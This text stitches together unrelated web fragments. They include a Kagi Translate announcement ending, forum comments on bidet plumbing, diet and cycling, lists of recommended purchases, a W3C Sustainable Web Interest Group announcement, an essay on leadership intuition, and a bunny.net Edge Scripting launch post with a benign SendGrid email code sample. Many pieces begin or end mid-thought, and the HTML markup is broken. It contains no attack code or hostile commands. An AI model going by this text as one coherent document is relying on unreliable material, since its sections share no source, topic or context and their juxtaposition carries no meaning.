<p>If you encounter issues or want to suggest improvements (or just want to share your most ridiculous Google Translate fail), please <a href="https://kagifeedback.org/d/5305-kagi-translate-feedback">send us feedback</a>. This is our first release and expect many improvements down the road.</p>

<h2>Next</h2>

<p>This isn’t just about better translation. It’s about raising standards in everyday tools. We believe that privacy and quality can coexist, that powerful tools don’t need to track their users, and that the best technology should simply work without compromises for the user.</p>

<p>Kagi Translate joins our family of tools (we call them ‘treats’): <a href="https://kagi.com/smallweb">Small Web</a>, <a href="https://kagi.com/summarizer">Universal Summarizer</a>, and <a href="https://kagi.com/fastgpt">FastGPT</a> alongside <a href="https://kagi.com/">Kagi Search</a> and <a href="https://kagi.com/orion">Orion Browser</a>.</p>

Standard size here is 3/8 inch which is the outer diameter of the tubing. They are easy to work with as you only need a tube cutter (or hacksaw with fine tooth pitch) and a wrench. You cut the tube, slide a compression nut over, slide the ferrule(s) on, insert the tube into the fitting, finger tighten the compression nut, make sure everything is aligned then tighten nut with wrench. No solder, no fancy crimp tools. You can disassemble and reassemble without leaks. The only issue is the ferrule winds up becoming swaged to the tube after wrench tightening so you have to cut the tube end off behind the ferrule if you want to replace the nut.</p><p>However, instead of using rigid metal or plastic tubing you commonly find a flexible hose assembly[1]. Only fancy installs use custom formed polished rigid tube for the look. We also tend to leave most of the plumbing in the walls and only the shut off valve protrudes from the wall. Maybe there are flexible hoses available in your region.</p><p>When I installed my bidet all I needed was a 3/8 compression tee[2] which they make specifically to tap shutoff valves. The bidet came with a 3/8 connection hose so that went to the tee and I was up and running. The big issue was electric - no outlets in the bathroom. So having seen how Japan loves extension cords I too used one, ran a 12 AWG cord out to the hall to a GFI adapter plugged into a socket. Jank but highly unlikely to cause a fire.</p><p>[1] <a href="https://www.homedepot.com/b/Plumbing-Plumbing-Parts-Supply-Lines/Toilet-Connector/N-5yc1vZbqjnZ1z138l5" rel="nofollow">https://www.homedepot.com/b/Plumbing-Plumbing-Parts-Supply-L...</a></p><p>[2] <a href="https://www.amazon.com/Breezliy-Lead-Free-Compression-Outlet-Connect/dp/B0BDLBZ9P6/" rel="nofollow">https://www.amazon.com/Breezliy-Lead-Free-Compression-Outlet...</a></p></div></td></tr>

Cutting out stuff that keeps me inflamed made a big difference as far as actually getting the nutrients from my food and not being hungry all the time. So did a target set of 40g protein, 40g fat, 10g fiber every meal, which brings me in around 1900 calories per day. The nice thing was that at first, that was a 500 calorie deficit per day, but I don't have to recalculate ever, because it's also the maintenance calorie intake for my target weight.

                  <p>I'm in Portland and I say that anyone that lives on the Eastside within 82nd and works within those bounds should just get a bike, it's sooo much faster to get around the city. We have infamously small city blocks so all those intersections make driving a car very slow through the city and for good reason as it's safer. If you hop on a bike and take a greenway that has all the stop signs facing perpendicular traffic you can zoom around the city no problem. It's the exact same amount of time (from door to desk) for me to drive to work as it is to bike to work (including the shower). It's just shy of 7 miles. No brainer.</p>

I can still easily hold conversations with them in, with the only negative being that they kinda reduce spacial perception, so I can't as easily tell where sounds are coming from.

Invaluable for any computer, electronic, or right to repair hobbyists.</p><p>Barely Under $1000
 - a Sebo E3 Premium canister vacuum ($950 after using resellers 10% off offer)</p><p>Our family's traditional standup vacuum (I forgot which brand but they're almost all identical) died after a few years of use and we were fed up with having to replace it. Most consumer vacuums available in the US suffer significantly from planned obsolescence, so I did some research and came across this German import Sebo e3 canister vacuum. Previously I had never heard of canister vacuums, they're literally never advertised in the US. Apparently Shark makes a few, but I had to specifically google "shark canister vacuum" to find them as there is no mention of them on their official website. It only took a couple raving reviews of canister vacuums to convince me of their potential, so I took the plunge with the Sebo.</p><p>I can safely say that this vacuum is a complete gamechanger. It is so much quieter, lighter, maneuverable, easy to use, and cleaner. No longer do floating dust particles cloud the windows' sun rays. No longer does my cat appear covered in dust because she found a spot I neglected to clean. No longer do I have to worry about breaking a weakening but crucial plastic clip or retainer when emptying the vacuum. Every part that experiences stress is metal and designed for longevity rather than aesthetics. Dare I say I even enjoy vacuuming now! It used to be a pain to lug around an entire upright vacuum over every square inch of the floor. Even the bags are better than emptying a canister. The bags are biodegradable and seal inside the vacuum, meaning dust never has a chance to escape. I used to have to empty the canister vacuum outside because of how much dust it released. Yes, the high price tag is rather intimidating for a vacuum purchase, but it's well worthwhile as it's been going for four years strong with absolutely zero issues. Also, most US resellers offer 10% off if you just call them to order it.</p></div></td></tr>

Changes my food bill and health. I can buy a bunch of healthy stuff from Costco, and make delicious meals daily in under 20 mins.</p><p>- AirTags ($28/piece). I tag my car, my luggage, my wallet, my keys, etc. And I never get anxious again.</p><p>- Black socks from Amazon. I bought 17 pairs of identical black socks, so I don’t ever have to match socks again. I can just grab any two.</p><p>- Samsers folding Bluetooth Keyboard $60. I pair this compact foldable keyboard with my iPhone and iPad, so I can type with an actual keyboard anywhere I go.</p><p>There are also a bunch of high quality grooming tools like a Panasonic electric razor, Tweezerman tweezers, rounded scissors, etc. that improveme my quality of life. There’s also a clever porcelain $4 toothbrush holder from Muji that is amazing. There’s also a toothpaste squeezer from Amazon.</p><p>Health wise, I’ve gotten better sleep from heavy curtains which blocks street noise. Also a wedge pillow has helped decrease snoring. An Aroma USB heated eye mask has helped with dry eye.</p><p>Under $1000:</p><p>- $180 per pair - 2 pairs of AirPods Pro 2. ANC for 10 hour work day, peace of mind.</p><p>- $200 Apple Watch Series 7. I charge it twice a day when I shower but otherwise I wear it all the time. Great for health tracking and sleep alarm, but it’s most useful feature for me is Apple Pay. I pay for stuff with a double click on the dial, no need to whip out my phone. It also unlocks my Mac automatically. I used to wear Tissots but no more. I’m sold on Apple Watch.</p><p>- $180 Levoit humidifier</p><p>- $200 Coway Air purifier.</p><p>- $100 Allbirds shoes. They’re expensive but I’ve had mine for 4 years, worn daily. They’re tech bro shoes but they do live up to their reputation.</p><p>- $120 Patagonia Better Sweater vest. This is more of a finance bro getup but it is warm and pairs with anything and still looks smarter than a hoodie. This matters. As much as tech people don’t care about dressing well, the person who dresses just a bit better gets taken just a bit more seriously. Humans are hardwired for superficial things unfortunately.</p><p>- $150/week up to deductible (I have HSA so high deductible but folks on FSA can get therapy for more cheaper plus most therapists have sliding scale). Best investment ever is weekly therapy sessions. I’ve worked through so many things that I’m a much more regulated person and am able to heal from a lot of stuff that were affecting new relationships. I wish I did this 20 years sooner.</p></div></td></tr>

Faster than cars in SF often. 2x as fast as trains usually.</p><p>- Command Strips: Easiest way to stick things on walls. Cheap from Costco</p><p>- Costco Membership: Higher quality of customer. Makes everything better</p><p>- Cast Iron / Carbon Steel pans: These are great, and a lot less trouble than people make them out to be.

						<p>W3C is pleased to announce the formation of the <a href="https://www.w3.org/groups/ig/sustainableweb/">Sustainable Web Interest Group</a>. The mission of the Sustainable Web Interest Group is to improve digital sustainability so that the Web works better for all people and the planet. The digital industry is responsible for 2-5% of global emissions, more than the aviation industry. If the Internet were a country it would be one of the top five polluters. The amount of water, energy, and minerals required increases annually, often putting the burden on developing economies.&nbsp;</p><p>The Sustainable Web IG will publish the <a href="https://w3c.github.io/sustyweb/">Web Sustainability Guidelines (WSG)</a>. This set of guidelines and <a href="https://github.com/w3c/sustyweb">associated materials</a> were drafted by the Sustainable Web Design Community Group. The WSG explains how to design and implement digital products and services that put people and the planet first. The guidelines are best practices based on measurable, evidence-based research; aimed at end-users, web workers, stakeholders, tool authors, educators, and policymakers. They are in line with the&nbsp;<a href="https://www.sustainablewebmanifesto.com/">Sustainable Web Manifesto</a> and aligned with&nbsp;<a href="https://www.globalreporting.org/standards/">GRI Standards</a> and the <a href="https://sdgs.un.org/">UN Sustainable Development Goals</a> to help organizations incorporate digital products and services into broader sustainability reporting initiatives.&nbsp;These guidelines will enable people to better understand the Internet’s impact on sustainability reporting. This includes emissions as well as stewardship principles.&nbsp;</p><p>In addition to publishing the guidelines, the IG plans to liaise with regulatory bodies to improve compliance targets. The membership of the community group from which this IG grew has excellent relationships with many organizations that will enable open discussions.&nbsp;</p><p>The Sustainable Web IG will be chaired by Tim Frick of MightyBytes, Ines Akrap, an Invited Expert from StoryBlok, and Mike Gifford, an Invited Expert who works for Civic Actions. Alexander Dawson will continue as editor. I, Tzviya Siegman, will be Team Contact of the group.</p><p>The group will work to improve measurability, which will enable more accurate information about sustainability and create more educational materials to enable implementations of the Web Sustainability Guidelines.&nbsp;</p><p>We look forward to enabling a more sustainable Web and hope you will <a href="https://www.w3.org/groups/ig/sustainableweb/">join us</a>.</p>

Like a forest creature, it works best from the shadows—the more directly you try to observe and analyze it, the more elusive it becomes.</span><span></span></p>
<p><span>This is not mere poetics; it reflects a fundamental truth about how our brains process information.</span><span></span></p>
<p><span>Research shows that intuition originates in the nonverbal regions of our brain, particularly the basal ganglia and anterior cingulate cortex. These regions process patterns outside of our conscious awareness.</span><span></span></p>
<p><span>When we try to put intuitive insights into words, we often end up with rationalization rather than explanation. The verbal parts of our brain, while trying to construct a coherent narrative, fill in gaps with plausible but potentially false explanations.<!--more--></span><span></span></p>
<p><span><strong>The Intelligence of Intuition</strong></span><span></span></p>
<p><span>Despite its mysterious nature, intuition is not magical—it's a form of unconscious intelligence. As researcher Gerd Gigerenzer argues, intuition operates through “smart heuristics”—simple, efficient rules our brains construct to handle real-world complexities. These mental shortcuts aren't irrational; they're sophisticated tools developed through years of experience.</span><span></span></p>
<p><span>Herbert Simon, another decision-making researcher, said expert intuition is "nothing more and nothing less than recognition."</span><span></span></p>
<p><span>Simply put, you can only connect the dots in new and unexpected ways if you have many dots to connect. This is why broad experience is essential for developing reliable intuition.</span><span></span></p>
<p><span>Reed Hastings' decision to pivot Netflix into original content production is a great example. Many analysts criticized his decision, saying it was safer to stay focused on licensing existing content. But Hastings' intuition, based on years of experience in entertainment and technology, recognized patterns pointing to a different future. Today, we’re living in that future.</span><span></span></p>
<p><span><strong>The Competence Connection</strong></span><span></span></p>
<p><span>The reliability of intuition is intimately linked to your level of competence in a specific domain.</span><span></span></p>
<p><span>Gary Klein's research on naturalistic decision-making shows how professionals make effective decisions in real-world settings through pattern recognition gained from experience.</span><span></span></p>
<p><span>At the unconscious competence level, where skills and knowledge are so deeply internalized that they’ve become second nature, intuition is remarkably reliable.</span><span></span></p>
<p><span>Leaders at this stage often don't need to double-check their gut feelings; their pattern recognition is highly refined and accurate.</span><span></span></p>
<p><span>However, at the conscious competence stage—where you're skilled but still need to think through decisions deliberately—intuition is less reliable. Here, analytical frameworks and mental models should lead the way. But even at this stage, intuition can be a final litmus test for decisions.</span><span></span></p>
<p><span><strong>The Litmus Test</strong></span><span></span></p>
<p><span>Contrary to common wisdom, which suggests using analysis to verify gut feelings, intuition often works better as a final check on analytical decisions.</span><span></span></p>
<p><span>If you've carefully analyzed a situation but something still feels wrong, that discomfort deserves attention. It might signal that your unconscious mind has recognized a pattern your conscious analysis missed. This is particularly true in uncertain and dynamic situations where, as Gigerenzer points out, logical analysis often falls short.</span><span></span></p>
<p><span>However—and this is critical—your response to this intuitive discomfort should depend on your competence level in the decision domain.</span><span></span></p>
<p><span>If you're at unconscious competence, that gut feeling might be worth listening to. If you're at conscious competence, it might simply reflect unfamiliarity with new territory.</span><span></span></p>
<p><span><strong>The Self-Awareness Imperative</strong></span><span></span></p>
<p><span>This brings us to perhaps the most critical skill for leveraging intuition effectively: self-awareness. Leaders must accurately assess their competence level in different domains to know how much to trust their intuition versus analysis. This self-knowledge helps calibrate the balance between gut feeling and analytical reasoning.</span><span></span></p>
<p><span><strong>The Quiet Guide</strong></span><span></span></p>
<p><span>Ultimately, intuition in leadership is less like a lighthouse showing the way and more like a quiet guide tapping you on the shoulder when something deserves a second look.</span><span></span></p>
<p><span>It works best when we create space for it to operate naturally, with a clear awareness of when—and how much—to trust its guidance.</span><span></span></p>
<p><span>The most effective leaders understand this delicate balance. They know when to let their experience-based intuition lead the way, when to rely on careful analysis, and perhaps most importantly, when that quiet tap on the shoulder means it's time to look again.</span><span></span></p>

<div id="readability-page-1" class="page"><div><p>Imagine a world where deploying and running powerful applications is as simple as writing JavaScript, a world where infrastructure fades into the background, and your code just runs exactly where it needs to be: at the edge of the internet, right next to your users.</p><p>We're excited to announce that this world is now a reality and introduce Bunny Edge Scripting!</p><p>Edge Scripting is a new, serverless JavaScript platform built on top of Deno, designed to help developers build, deploy, and run JavaScript applications on our massive global network without worrying about hardware, scaling, or load balancing ever again.</p><p>With just a few clicks, Edge Scripting allows you to connect your GitHub repository and automatically deploy and run your application at the edge of the internet to enjoy unparalleled ease, speed, and scalability by simply pushing your code.</p><h3 id="connect-push-done">Connect. Push. Done.</h3><p>When we designed Edge Scripting, our goal was simple: allow developers to build and run their applications in the simplest way possible, and with Bunny Edge Scripting, your GitHub main branch becomes your launchpad. </p><p>Connecting your account takes just a few clicks. Then, once you're done with your code changes, just push them to your main branch, and in just seconds, your app is built and deployed globally.</p><p>No more tedious compiling, versioning, rollback worries, or complex CI/CD configurations. Edge Scripting handles the heavy lifting so you can focus on what you do best: writing code. With automatic deployments and seamless integration into your development workflow, getting your application live has never been easier. It's as simple as connecting your repo, pushing your code, and you're live.</p><figure><img src="https://bunny.net/blog/content/images/2024/10/image-3.png" alt="" loading="lazy" width="1405" height="956" srcset="https://bunny.net/blog/content/images/size/w600/2024/10/image-3.png 600w, https://bunny.net/blog/content/images/size/w1000/2024/10/image-3.png 1000w, https://bunny.net/blog/content/images/2024/10/image-3.png 1405w" sizes="(min-width: 720px) 720px"><figcaption><span>Overview dashboard screenshot</span></figcaption></figure><h3 id="infinite-scalability-without-the-hassle-or-the-price-tag">Infinite scalability without the hassle or the price tag</h3><p>We've all been there: your app gains popularity, and suddenly, you're scrambling to add new servers. This instantly brings a mountain of new responsibilities, from monitoring, failover, load balancing, and security. All of this requires expertise, but more than anything, it requires time. The cloud was supposed to simplify this, but nowadays, it often seems to add even more complexity.</p><p>This is why we designed Edge Scripting to be as hands-free as possible. We've built it directly into our global network with automatic scalability, load balancing, failover, and robust security built-in without you even lifting a finger. Everything is seamlessly handled at the edge of the network.</p><p>What also helps you scale infinitely is the pricing.</p><p>We're on a mission to help make the internet hop faster, which also includes making it affordable to everyone. We believe that powerful compute resources should be accessible without breaking the bank. No matter if you're just building a simple contact form or running a massive global operation, Edge Scripting pricing was designed to work and scale with you.</p><p>It comes with no minimums, no complex billing, and no hidden costs. You only pay for the resources that you use:</p><ul><li><strong>Requests</strong>: $0.2 per million</li><li><strong>CPU Time</strong>: $0.02 per 1,000 of CPU time seconds</li></ul><p>If you're serving nothing? You're paying nothing, too!</p><h3 id="make-the-cdn-edge-your-playground-with-middleware-apps">Make the CDN edge your playground with Middleware Apps</h3><p>Edge Scripting wasn't just a compute product that we bolted on and deployed globally. Instead, we built it straight into the fabric of one of the largest networks on the internet. As a result, Edge Scripting turns our ultra-fast global network into a CDN that you can program yourself. With this, we're unlocking powerful new ways to build, optimize, and secure applications closer to users than ever before.</p><p>Today, bunny.net is an entry point for over 1.5 million websites and moreover, serves assets for millions of other domains. This gives us a powerful role in security, load balancing, caching, and smart logic at the edge. While we already offer powerful features such as Edge Rules, Edge Scripting takes this to a whole new level, making the edge your playground with the new Middleware Apps.</p><p>Middleware Apps were designed to go beyond standalone applications and provide a toolkit for customizing the CDN behavior on a much deeper level. With Middleware Apps, you can integrate directly into Bunny CDN and seamlessly extend it with your own functionality. </p><figure><img src="https://bunny.net/blog/content/images/2024/11/bunny-edge-scripting-middleware-app-diagram.svg" alt="" loading="lazy" width="2190" height="353"><figcaption><span>Middleware App Pipeline</span></figcaption></figure><p>Be it load balancing, security checks, A/B testing, caching, or request modification, the Middleware mode allows you to take control of how the CDN should respond and adjust it on demand. It’s as close as you can get to running your own custom CDN but without the infrastructure overhead.</p><p>At launch, Middleware Apps support modifying the origin request and response, but this is only the beginning. We are actively working on expanding this functionality to give you even deeper control over caching, revalidation, and other core CDN behaviors soon.</p><h3 id="your-first-edge-application-takes-just-a-few-lines-of-code">Your first edge application takes just a few lines of code</h3><p>Edge Scripting isn't just simple to deploy, it's also incredibly easy to code. To help you effortlessly run standalone applications across Deno, Node.js, and Bunny Edge Scripting, we created <a href="https://github.com/BunnyWay/edge-script-sdk?ref=bunny.net" rel="noreferrer">BunnySDK</a>. The SDK is a lightweight wrapper that closely mirrors the Deno server implementation but adds the ability to run seamlessly across different environments.</p><p>This makes getting started with Edge Scripting unbelievably simple, taking as little as a few lines of code.</p>

<p>The snippet above is all it takes to create a global, edge-optimized application that is able to respond instantly to user requests at the edge, but also run locally on your machine.</p><p>Middleware Applications are equally simple. We've made it extremely easy to modify both the request and response of any CDN request. Middleware Apps allow you to inject custom logic directly into the existing CDN processing pipeline. This provides a seamless integration into any origin configuration, Edge Rules, and Pull Zone configuration without having to rewrite any complex proxy logic yourself.</p>

<p>It's this easy to add a request and response header to any Pull Zone. You can then easily trigger the script for all the requests or even execute dynamically using Edge Rules.</p><p>Of course, writing software is not just about producing code, but sharing it. One of our reasons for building Edge Scripting on top of Deno was its existing support for a vast ecosystem of external packages. For example, integrating an external service like SendGrid to send an email is this simple:</p>
<!--kg-card-begin: html-->
<p><strong>SendGrid example:</strong></p><pre><span>import</span> * <span>as</span> <span>BunnySDK</span> <span>from</span> <span>"@bunny.net/edgescript-sdk"</span>;
<span>import</span> sgMail <span>from</span> <span>"https://esm.sh/@sendgrid/mail@7.7.0"</span>;

<span>// Set your SendGrid API key</span>
sgMail.<span>setApiKey</span>(<span>Deno</span>.<span>env</span>.<span>get</span>(<span>'SENDGRID_API_KEY'</span>));

<span>BunnySDK</span>.<span>net</span>.<span>http</span>.<span>serve</span>(<span>async</span> (req) =&gt; { 
    <span>const</span> msg = {
        <span>to</span>: <span>'user@example.com'</span>,
        <span>from</span>: <span>'you@yourdomain.com'</span>,
        <span>subject</span>: <span>'Welcome to Bunny Edge Scripting!'</span>,
        <span>text</span>: <span>'This email was sent directly from the edge.'</span>,
    };

    <span>try</span> {
        <span>await</span> sgMail.<span>send</span>(msg);
        <span>return</span> <span>new</span> <span>Response</span>(<span>"Email sent successfully!"</span>);
    } <span>catch</span> (error) {
        <span>console</span>.<span>error</span>(error);
        <span>return</span> <span>new</span> <span>Response</span>(<span>"Failed to send email."</span>, { <span>status</span>: <span>500</span> });
    }

<p>Gone are the days of wasting hours to build, deploy, and connect a simple contact form. Now, all it takes is a few lines of code.</p><p>To learn how to get started easily and for more examples, you can visit the <a href="https://docs.bunny.net/docs/overview-1?ref=bunny.net" rel="noreferrer">Edge Scripting documentation</a>.</p><h3 id="powered-by-deno-flexibility-speed-and-freedom-without-the-lock-in">Powered by Deno: Flexibility, speed, and freedom without the lock-in</h3><p>When we set out to build Bunny Edge Scripting, we set out to reinvent the user experience for how developers build, deploy, and run applications at the edge. What we didn't want to do was to build yet another JavaScript runtime with limited capabilities. We wanted developers to be able to build on a familiar ecosystem, complete with millions of modules, and without the burden of lock-in.</p><p>That's why we decided to combine the speed of bunnies with the might of dinosaurs, and build Edge Scripting on top of Deno. <a href="https://deno.com/?ref=bunny.net" rel="noreferrer">Deno</a> is an open-source, modern JavaScript runtime designed to uncomplicate JavaScript development and eliminate unnecessary complexity. Best to be said by Ryan, the Deno founder himself:</p>

<p>On top of just being simple, building on Deno brings a list of additional advantages:</p><ul><li><strong>Native TypeScript support:</strong> You can easily write type-safe code in TypeScript without any extra configuration.</li><li><strong>Enhanced security:</strong> Deno runs in a secure sandbox by default, minimizing vulnerabilities.</li><li><strong>Ultra-fast performance:</strong> Being built in Rust, Deno offers exceptional performance and ultra-low startup times.</li><li><strong>A vast ecosystem of modules:</strong> Deno supports tens of thousands of native modules and millions of npm packages to help you build anything easily.</li></ul><p>We're excited to empower developers with a platform that doesn't focus on locking you in, but instead, empowers you to easily build and run your applications anywhere.</p><h3 id="batteries-included-compute-performance-and-security">Batteries included: Compute, performance, and security</h3><p>Out of the box, Deno comes with everything you need to build, test, and deploy your applications. With Edge Scripting, we're building further on top of that. </p><p>Leveraging our massive global footprint, any application deployed to bunny.net is automatically accelerated by our global network and automatically integrates with edge caching, powerful security, logging, and analytics.</p><p>This means your applications are always protected by powerful DDoS protection, application attacks, and have built-in CDN resource caching for the absolute best performance possible.</p><p>There's no more need to combine multiple different services for DNS, CDN, and load balancing. With Edge Scripting, it all comes built-in by default. On top of that, Edge Scripting adds even more crucial features to help you run applications globally, such as real-time logging, release control, environmental variables, and secret management.</p><h3 id="built-in-real-time-logging">Built-in real-time logging</h3><p>Debugging and logging on a globally distributed scale brings some unique challenges, and with thousands of servers across 119+ datacenters globally, we understand this very well.</p><p>To make these challenges as simple as possible for developers, we built Edge Scripting with built-in real-time logging, allowing you to seamlessly observe what your app is doing in the wild. </p><p>With the live log view, you can quickly see what's going on, and dig deeper into specific issues thanks to regional filters and search support.</p><figure><img src="https://bunny.net/blog/content/images/2024/10/image-2.png" alt="" loading="lazy" width="1499" height="562" srcset="https://bunny.net/blog/content/images/size/w600/2024/10/image-2.png 600w, https://bunny.net/blog/content/images/size/w1000/2024/10/image-2.png 1000w, https://bunny.net/blog/content/images/2024/10/image-2.png 1499w" sizes="(min-width: 720px) 720px"><figcaption><span>Live logging dashboard</span></figcaption></figure><p>For advanced users, we also exposed the logging via an HTTP and a live WebSocket API, allowing you to easily connect it to other platforms.</p><h3 id="simple-version-and-release-controls">Simple version and release controls</h3><p>We get it, sometimes things break. A critical bug slips through or an unexpected rollback is urgently needed. That's why Edge Scripting introduces a simple, and intuitive version control system. Every time you make a change, or publish a release, we automatically create a version history for you, making instant global rollbacks just a few clicks away.</p><figure><img src="https://bunny.net/blog/content/images/2024/10/image-1.png" alt="" loading="lazy" width="1515" height="639" srcset="https://bunny.net/blog/content/images/size/w600/2024/10/image-1.png 600w, https://bunny.net/blog/content/images/size/w1000/2024/10/image-1.png 1000w, https://bunny.net/blog/content/images/2024/10/image-1.png 1515w" sizes="(min-width: 720px) 720px"><figcaption><span>Deployment version management</span></figcaption></figure><p>Even better, we are taking it a step further. Soon, we plan to introduce a built-in dynamic developer mode, allowing you to easily run a specific commit, release, or package using a dynamically mapped application URL. That means as soon as you push code, you can instantly test it live, without disrupting your production environment.</p><h3 id="full-api-and-terraform-support">Full API and Terraform support</h3><p>We understand that automation and infrastructure as code are essential for any modern development workflow. That's why, like all of our products, Bunny Edge Scripting comes with comprehensive <a href="https://docs.bunny.net/reference/getedgescriptcodeendpoint_getcode?ref=bunny.net" rel="noreferrer">API support</a> as well as a <a href="https://registry.terraform.io/providers/BunnyWay/bunnynet/latest/docs?ref=bunny.net" rel="noreferrer">Terraform provider</a>.</p><p>This enables you to manage and deploy your applications programmatically and easily integrate into your existing CI/CD pipelines. With near-real-time configuration changes and deployments, Edge Scripting allows you to build powerful workflows, automate tasks, and execute dynamic code—giving you a robust automation tool with just a few API calls.</p><h3 id="moving-beyond-javascript-with-wasm-support">Moving beyond JavaScript with WASM support</h3><p>Today, JavaScript is by far the most popular programming language in the world, but why stop there? For those wanting to do more, Deno also brings WebAssembly (WASM) support, allowing you to bring in Rust, C++, or any other language, and make it run globally with just as much ease. This provides even faster and more consistent performance, rivaling low-level native code.</p><p>Getting WASM running is very straightforward, and Deno conveniently exposes WebAssembly to the standard browser interface. All you need is a binary to run.</p>
